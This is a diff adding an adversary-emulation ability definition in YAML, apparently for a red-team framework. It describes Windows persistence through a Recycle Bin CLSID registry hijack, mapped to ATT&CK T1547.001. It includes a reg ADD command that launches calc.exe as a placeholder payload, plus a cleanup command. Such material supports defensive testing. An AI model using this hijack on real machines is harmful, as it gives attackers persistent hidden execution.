@@ -1,0 +1,20 @@
+---
+- id: 0dbdf1a2a87e718a6ac8a8e3415a7fac
+  name: Add persistance via Recycle bin
+  description: 'Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)
+
+    User have to clic on the recycle bin to lauch the payload (here calc)
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1547.001
+    name: 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
+  platforms:
+    windows:
+      cmd:
+        command: reg ADD "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"
+          /ve /d "calc.exe" /f
+        payloads: []
+        cleanup: reg DELETE "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open"
+          /f
